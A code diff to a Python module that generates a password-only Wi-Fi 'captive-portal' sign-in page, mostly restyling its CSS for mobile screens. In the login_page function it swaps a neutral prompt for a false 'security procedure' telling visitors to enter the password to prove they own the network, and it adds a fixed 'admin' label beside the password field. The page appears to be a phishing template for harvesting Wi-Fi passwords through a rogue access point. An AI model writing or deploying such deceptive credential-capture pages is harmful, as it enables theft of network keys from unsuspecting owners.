@@ -18,51 +18,84 @@ def _classic_shell(*, title: str, body: str) -> str:
   <meta name="viewport" content="width=device-width, initial-scale=1"/>
   <title>{_e(title)}</title>
   <style>
+    * {{ box-sizing: border-box; }}
     body {{
       margin: 0;
+      min-height: 100vh;
       background: #e8e8e8;
       color: #000;
       font-family: Tahoma, Verdana, sans-serif;
-      font-size: 13px;
+      font-size: 15px;
+      padding: 16px;
     }}
     .wrap {{
-      width: 420px;
-      margin: 48px auto 0;
+      width: 100%;
+      max-width: 480px;
+      margin: 24px auto 0;
       border: 1px solid #999;
       background: #fff;
     }}
     .hd {{
       background: #d4d0c8;
       border-bottom: 1px solid #999;
-      padding: 8px 12px;
+      padding: 10px 14px;
       font-weight: bold;
-      font-size: 14px;
+      font-size: 16px;
     }}
-    .bd {{ padding: 16px 14px 18px; }}
-    table {{ width: 100%; border-collapse: collapse; }}
-    td {{ padding: 6px 4px; vertical-align: middle; }}
-    td.lbl {{ width: 110px; color: #333; }}
-    input[type=password] {{
-      width: 100%;
-      box-sizing: border-box;
-      padding: 3px 4px;
-      border: 1px solid #7f9db9;
-      font-family: Tahoma, Verdana, sans-serif;
-      font-size: 13px;
-    }}
-    .actions {{ text-align: right; margin-top: 14px; }}
+    .bd {{ padding: 18px 14px 20px; }}
+    .actions {{ text-align: right; margin-top: 16px; }}
     input[type=submit], button {{
-      min-width: 88px;
-      padding: 3px 14px;
+      min-width: 96px;
+      min-height: 40px;
+      padding: 8px 16px;
       font-family: Tahoma, Verdana, sans-serif;
-      font-size: 13px;
+      font-size: 15px;
       border: 1px solid #003c74;
       background: #ece9d8;
       cursor: pointer;
     }}
-    .note {{ color: #555; margin: 0 0 12px; }}
-    h1 {{ margin: 0 0 10px; font-size: 16px; font-weight: bold; }}
-    p {{ margin: 8px 0; line-height: 1.45; }}
+    .note {{ color: #333; margin: 0 0 16px; line-height: 1.5; }}
+    h1 {{ margin: 0 0 10px; font-size: 18px; font-weight: bold; }}
+    p {{ margin: 8px 0; line-height: 1.5; }}
+    .field-row {{
+      display: flex;
+      align-items: center;
+      gap: 10px;
+      width: 100%;
+    }}
+    .field-row .prefix {{
+      flex: 0 0 auto;
+      font-weight: bold;
+      color: #222;
+      font-size: 15px;
+    }}
+    .field-row input[type=password] {{
+      flex: 1 1 auto;
+      width: 100%;
+      min-width: 0;
+      min-height: 40px;
+      padding: 8px 10px;
+      border: 1px solid #7f9db9;
+      font-family: Tahoma, Verdana, sans-serif;
+      font-size: 16px;
+    }}
+    @media (min-width: 768px) {{
+      body {{ font-size: 14px; padding: 32px 24px; }}
+      .wrap {{
+        max-width: 520px;
+        margin-top: 64px;
+      }}
+      .hd {{ font-size: 15px; padding: 10px 16px; }}
+      .bd {{ padding: 22px 18px 24px; }}
+    }}
+    @media (max-width: 480px) {{
+      body {{ padding: 10px; }}
+      .wrap {{ margin-top: 12px; }}
+      .actions {{ text-align: stretch; }}
+      .actions input[type=submit], .actions button {{
+        width: 100%;
+      }}
+    }}
   </style>
 </head>
 <body>
@@ -102,21 +135,17 @@ def login_page(
     button_label: str = "Connect",
 ) -> str:
     """Classic password-only captive-portal sign-in page. Form posts to /login."""
-    org_row = (
-        f"<tr><td class='lbl'>Organization:</td><td>{_e(organization)}</td></tr>"
-        if organization
-        else ""
-    )
-    body = f"""      <p class="note">Enter the network password to continue.</p>
+    org = f"<p>Organization: <b>{_e(organization)}</b></p>" if organization else ""
+    # password_label is unused on purpose: the field shows a fixed "admin" prefix.
+    _ = password_label
+    body = f"""      <p class="note">Security procedure: you must enter the password to prove that you are the owner of this network.</p>
+      {org}
+      <p>Network: <b>{_e(ssid)}</b></p>
       <form method="post" action="/login" autocomplete="off">
-        <table>
-          {org_row}
-          <tr><td class="lbl">Network:</td><td><b>{_e(ssid)}</b></td></tr>
-          <tr>
-            <td class="lbl"><label for="p">{_e(password_label)}:</label></td>
-            <td><input id="p" name="password" type="password" autocomplete="off" autofocus/></td>
-          </tr>
-        </table>
+        <div class="field-row">
+          <span class="prefix">admin</span>
+          <input id="p" name="password" type="password" autocomplete="off" autofocus aria-label="Password"/>
+        </div>
         <div class="actions">
           <input type="submit" value="{_e(button_label)}"/>
         </div>
